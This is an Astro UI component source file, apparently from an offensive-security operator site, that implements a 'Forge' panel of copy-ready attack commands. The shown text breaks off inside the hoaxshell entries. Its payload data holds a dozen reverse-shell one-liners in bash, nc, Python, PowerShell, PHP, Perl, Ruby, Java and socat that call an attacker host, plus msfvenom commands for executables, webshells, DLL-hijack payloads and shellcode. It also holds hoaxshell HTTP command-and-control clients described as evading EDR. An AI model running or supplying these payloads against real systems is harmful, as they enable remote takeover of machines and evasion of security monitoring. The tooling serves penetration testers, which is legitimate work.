---
// src/components/Forge.astro
//
// Floating-button "Forge" — quick-action toolkit for operators.
// Sits to the left of OperatorConsole (which sits left of PaletteTuner).
//
// Five tabs:
//   - shells     reverse-shell one-liners (12 variants, dropdown)
//   - listeners  netcat/socat/pwncat/msfconsole listener recipes (5, dropdown)
//   - msfvenom   payload generation commands (10, dropdown)
//   - hoaxshell  HTTP-based windows shell (3 entries, dropdown)
//   - encode     URL / Base64 / Base64-UTF16LE / Hex / HTML / Unicode / JWT
//                (flat layout — encoders are interactive, each needs its own
//                input + output)
//
// Layout rationale (revised after operator feedback):
//   - Vertical list of every command made for too much scrolling. Each tab
//     now uses a dropdown to pick a variant, shows ONE command full-width.
//   - Hoaxshell uses the same dropdown pattern for consistency.
//   - Encode stays flat — its 7 encoders are interactive, dropdown doesn't fit.
//
// State source: reads from OperatorConsole's localStorage keys
//   codex.op.target, codex.op.attacker, codex.op.lport, codex.op.user,
//   codex.op.domain — so operators who've set values get every Forge entry
//   pre-substituted automatically.
//
// Z-index: 9998 (below OperatorConsole's 9999, below PaletteTuner's 10000) —
// preserves "hover halo paints over the neighbor to the left" convention.
---

<div class="codex-forge" id="codex-forge">

  <!-- Floating toggle button -->
  <button
    type="button"
    class="codex-forge__toggle"
    aria-label="Forge — payloads, listeners, encoders"
    aria-expanded="false"
    aria-controls="codex-forge-panel"
    title="Forge — payloads, listeners, encoders"
  >
    <!-- Flame icon — evokes "forge fire" and "execute/payload" simultaneously.
         Adapted from the Lucide flame glyph. Scales cleanly at 18px display. -->
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="1.6"
      stroke-linecap="round"
      stroke-linejoin="round"
      aria-hidden="true"
    >
      <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path>
    </svg>
  </button>

  <!-- Panel -->
  <div
    class="codex-forge__panel"
    id="codex-forge-panel"
    role="dialog"
    aria-label="Forge"
    aria-hidden="true"
  >
    <!-- Header with title + close -->
    <div class="codex-forge__header">
      <span class="codex-forge__title">forge</span>
      <button type="button" class="codex-forge__close" aria-label="Close forge">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <line x1="18" y1="6" x2="6" y2="18"></line>
          <line x1="6" y1="6" x2="18" y2="18"></line>
        </svg>
      </button>
    </div>

    <!-- Tab strip -->
    <div class="codex-forge__tabs" role="tablist">
      <button type="button" class="codex-forge__tab codex-forge__tab--active" role="tab" aria-selected="true"  data-forge-tab="shells">shells</button>
      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="listeners">listeners</button>
      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="msfvenom">msfvenom</button>
      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="hoaxshell">hoaxshell</button>
      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="encode">encode</button>
    </div>

    <!-- Body -->
    <div class="codex-forge__body">

      <!-- ============== SHELLS / LISTENERS / MSFVENOM / HOAXSHELL ============== -->
      <div class="codex-forge__pane codex-forge__pane--active" data-forge-pane="shells" role="tabpanel">
        <div class="codex-forge__pane-body" data-forge-payload-pane="shells"></div>
      </div>

      <div class="codex-forge__pane" data-forge-pane="listeners" role="tabpanel" hidden>
        <div class="codex-forge__pane-body" data-forge-payload-pane="listeners"></div>
      </div>

      <div class="codex-forge__pane" data-forge-pane="msfvenom" role="tabpanel" hidden>
        <div class="codex-forge__pane-body" data-forge-payload-pane="msfvenom"></div>
      </div>

      <div class="codex-forge__pane" data-forge-pane="hoaxshell" role="tabpanel" hidden>
        <p class="codex-forge__pane-lede">
          HTTP-based Windows shell — evades EDR that hooks process telemetry
          but ignores web traffic. The entries below are <strong>client
          payloads</strong> to execute on the target. You also need a matching
          listener (see footer) — substitute its session ID components into
          <code>&lt;SID1&gt;</code> / <code>&lt;SID2&gt;</code> /
          <code>&lt;SID3&gt;</code> before pasting on the target.
        </p>
        <div class="codex-forge__pane-body" data-forge-payload-pane="hoaxshell"></div>
        <p class="codex-forge__pane-foot">
          Listener: run <a href="https://github.com/t3l3machus/hoaxshell/tree/main/revshells" target="_blank" rel="noopener noreferrer"><code>hoaxshell-listener.py</code></a>
          with <code>-t cmd-curl</code> / <code>-t ps-iex</code> /
          <code>-t ps-outfile</code> (add <code>-cm</code> suffix for CLM
          variants; pass <code>-c cert.pem -k key.pem</code> for https). The
          listener prints the matching SID at startup — split it on
          <code>-</code> and substitute the three segments into the payload above.
        </p>
      </div>

      <!-- ============== ENCODE (flat — interactive encoders) ============== -->
      <div class="codex-forge__pane" data-forge-pane="encode" role="tabpanel" hidden>

        <div class="codex-forge__enc" data-forge-encoder="url">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">url</span>
            <div class="codex-forge__enc-dir">
              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
            </div>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="base64">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">base64</span>
            <div class="codex-forge__enc-dir">
              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
            </div>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="base64-utf16le">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">base64 (powershell)</span>
            <span class="codex-forge__meta">utf-16le · for -EncodedCommand</span>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder='paste powershell, e.g.  IEX(New-Object Net.WebClient).DownloadString("http://...")'></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="hex">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">hex</span>
            <div class="codex-forge__enc-dir">
              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
            </div>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value or hex string..."></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="html">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">html entities</span>
            <div class="codex-forge__enc-dir">
              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
            </div>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="unicode">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">unicode \u escapes</span>
            <div class="codex-forge__enc-dir">
              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
            </div>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder='paste raw text or \u0061-style escapes...'></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

        <div class="codex-forge__enc" data-forge-encoder="jwt">
          <div class="codex-forge__row-head">
            <span class="codex-forge__label">jwt decode</span>
            <span class="codex-forge__meta">read-only · header + payload, no signature verify</span>
          </div>
          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste jwt: eyJhbGc...eyJzdWI...sigBytes"></textarea>
          <div class="codex-forge__enc-out-row">
            <div class="codex-forge__enc-out" aria-live="polite"></div>
            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
          </div>
        </div>

      </div>

    </div>

    <!-- Toast -->
    <div class="codex-forge__toast" role="status" aria-live="polite" aria-atomic="true"></div>
  </div>

</div>

<script is:inline>
  (function () {
    'use strict';

    // Module-level state: tracks the currently open dropdown (if any).
    // Used by the outside-click handler to know which menu to leave open
    // when the click target is inside that menu (which is now appended
    // to document.body and so not a DOM descendant of any dropdown).
    let openMenu = null;
    let openDropdown = null;

    // PAYLOAD DATA ─ each entry: { label, meta, cmd }
    const PAYLOADS = {
      shells: [
        { label: 'bash tcp',         meta: 'linux · simplest, no nc required',
          cmd: 'bash -c "bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1"' },
        { label: 'nc traditional',   meta: 'linux · -e flag (rare on modern boxes)',
          cmd: 'nc -e /bin/sh <ATTACKER> <LPORT>' },
        { label: 'nc openbsd + fifo', meta: 'linux · works when nc lacks -e',
          cmd: 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER> <LPORT> >/tmp/f' },
        { label: 'python (linux)',   meta: 'linux · python3, present on most boxes',
          cmd: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER>",<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'' },
        { label: 'python (windows)', meta: 'windows · python.exe on path required',
          cmd: 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'<ATTACKER>\',<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\'cmd\'])"' },
        { label: 'powershell iex',   meta: 'windows · most common, EDR-signatured',
          cmd: 'powershell -nop -c "$client=New-Object Net.Sockets.TCPClient(\'<ATTACKER>\',<LPORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
        { label: 'php fsockopen',    meta: 'webshell · works in php LFI/RFI chains',
          cmd: 'php -r \'$sock=fsockopen("<ATTACKER>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
        { label: 'php exec',         meta: 'webshell · simplest one-liner form',
          cmd: 'php -r \'exec("/bin/bash -c \'"\'"\'bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1\'"\'"\'");\'' },
        { label: 'perl',             meta: "linux · usually present where python isn't",
          cmd: 'perl -e \'use Socket;$i="<ATTACKER>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
        { label: 'ruby',             meta: 'linux · rails/jenkins environments',
          cmd: 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("<ATTACKER>","<LPORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' },
        { label: 'java',             meta: 'jvm targets · tomcat/jenkins/jboss',
          cmd: 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1"});' },
        { label: 'socat (full tty)', meta: 'linux · proper pty, ^C and tab-complete work',
          cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER>:<LPORT>" },
      ],
      listeners: [
        { label: 'nc plain',           meta: 'simplest, no line-editing',
          cmd: 'nc -lvnp <LPORT>' },
        { label: 'rlwrap + nc',        meta: 'readline + arrow-key history',
          cmd: 'rlwrap nc -lvnp <LPORT>' },
        { label: 'socat full-tty',     meta: 'pair with socat client shell',
          cmd: 'socat -d -d TCP4-LISTEN:<LPORT>,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane' },
        { label: 'pwncat-cs',          meta: 'auto-upgrades tty, persistence, history',
          cmd: 'pwncat-cs -lp <LPORT>' },
        { label: 'msfconsole handler', meta: 'match payload type to your shell',
          cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"' },
      ],
      msfvenom: [
        { label: 'windows x64 exe',                     meta: 'reverse_tcp · classic windows payload',
          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f exe -o shell.exe' },
        { label: 'windows x64 exe (meterpreter https)', meta: 'more evasive · staged over TLS',
          cmd: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=<LPORT> -f exe -o meter.exe' },
        { label: 'linux x64 elf',                       meta: 'drop and chmod +x on linux targets',
          cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f elf -o shell.elf' },
        { label: 'aspx webshell',                       meta: 'iis upload chain · drop into webroot',
          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f aspx -o shell.aspx' },
        { label: 'jsp webshell',                        meta: 'tomcat · drop in webapps/ROOT/',
          cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.jsp' },
        { label: 'war webshell',                        meta: 'tomcat manager · /manager/html deploy',
          cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f war -o shell.war' },
        { label: 'php webshell',                        meta: 'lfi/upload chains · request to trigger',
          cmd: 'msfvenom -p php/reverse_php LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.php' },
        { label: 'windows dll',                         meta: 'dll hijack · sideload via writable path',
          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f dll -o shell.dll' },
        { label: 'raw shellcode',                       meta: 'for injection / overflow exploitation',
          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.bin' },
        { label: 'matching handler',                    meta: 'windows x64 shell_reverse_tcp · run before payload',
          cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"' },
      ],
      hoaxshell: [
        // Each payload is a CLIENT-SIDE string to paste on the windows target.
        // Placeholders:
        //   <ATTACKER>:<LPORT>  → filled from OperatorConsole
        //   <SID1>-<SID2>-<SID3> → operator substitutes from the listener's
        //                          printed session ID after starting it
        //
        // SID structure: the listener (hoaxshell-listener.py or revshells.com's
        // downloaded variant) prints one 26-char Authorization header value of
        // the form "abc12345-def67890-aabbccdd". The three hyphen-separated
        // segments are used as the URL paths /verify, /get-cmd, /post-result.
        // Substitute each segment into the matching <SID*> placeholder.

        { label: 'Windows CMD cURL',                meta: 'cmd.exe via cURL · no PowerShell required',
          cmd: '@echo off&cmd /V:ON /C "SET ip=<ATTACKER>:<LPORT>&&SET sid="Authorization: <SID1>-<SID2>-<SID3>"&&SET protocol=http://&&curl !protocol!!ip!/<SID1> -H !sid! > NUL && for /L %i in (0,0,0) do (curl -s !protocol!!ip!/<SID2> -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/<SID3> -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL' },

        { label: 'Windows CMD cURL https',          meta: 'cmd.exe via cURL · TLS (cert ignored with -k)',
          cmd: '@echo off&cmd /V:ON /C "SET ip=<ATTACKER>:<LPORT>&&SET sid="Authorization: <SID1>-<SID2>-<SID3>"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/<SID1> -H !sid! > NUL & for /L %i in (0,0,0) do (curl -fs -k !protocol!!ip!/<SID2> -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/<SID3> -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL' },

        { label: 'PowerShell IEX',                  meta: 'IRM + Invoke-Expression · default variant',
          cmd: '$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'http://\';$v=IRM -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}' },

        { label: 'PowerShell IEX https',            meta: 'IEX over TLS · trusts self-signed certs',
